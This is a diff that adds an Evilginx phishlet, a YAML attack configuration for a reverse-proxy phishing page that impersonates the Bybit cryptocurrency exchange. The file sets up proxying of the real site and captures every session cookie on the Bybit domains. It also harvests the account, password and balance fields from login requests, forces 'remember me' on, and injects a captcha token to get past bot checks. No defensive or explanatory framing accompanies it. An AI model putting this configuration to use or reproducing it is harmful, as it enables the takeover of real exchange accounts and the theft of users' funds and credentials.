@@ -1,0 +1,68 @@
+min_ver: "3.3.0"
+author: "@rockybelling"
+
+proxy_hosts:
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "bybit.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - { phish_sub: "www", orig_sub: "www", domain: "google.com", session: false }
+
+sub_filters:
+  - {
+      triggers_on: "www.bybit.com",
+      orig_sub: "www",
+      domain: "bybit.com",
+      search: "https://{hostname}/",
+      replace: "https://{hostname}/",
+      mimes:
+        [
+           "text/html",
+          "text/xml",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+        ],
+    }
+
+auth_urls:
+  - "/user/assets/home"
+  - "/user/assets/home/"
+  - "/user/assets/home/fiat"
+  - "/user/assets/home/fiat/"
+  - "/user/assets"
+
+auth_tokens:
+  - { domain: ".bybit.com", keys: [".*,regexp"] }
+  - { domain: "bybit.com", keys: [".*,regexp"] }
+  - { domain: "www.bybit.com", keys: [".*,regexp"] }
+  - { domain: "api2.bybit.com", keys: ["g-recaptcha-response", ".*,regexp"] }
+
+credentials:
+  username: { key: "account", search: "(.*)", type: "post" }
+  password: { key: "password", search: "(.*)", type: "post" }
+  custom:
+    - { key: "balance", search: "(.*)", type: "post" }
+
+login: { domain: "www.bybit.com", path: "/en/login" }
+
+force_post:
+  - path: "/api/v3/account/login"
+    search:
+      - { key: "email", search: "(.*)" }
+      - { key: "password", search: "(.*)" }
+    force:
+      - { key: "remember", value: "true" }
+    type: "post"
+
+  - path: "/api/v3/account/login"
+    search:
+      - { key: "g-recaptcha-response", search: ".*" }
+    force:
+      - { key: "g-recaptcha-response", value: "{{.captcha_token}}" }
+    type: "post"
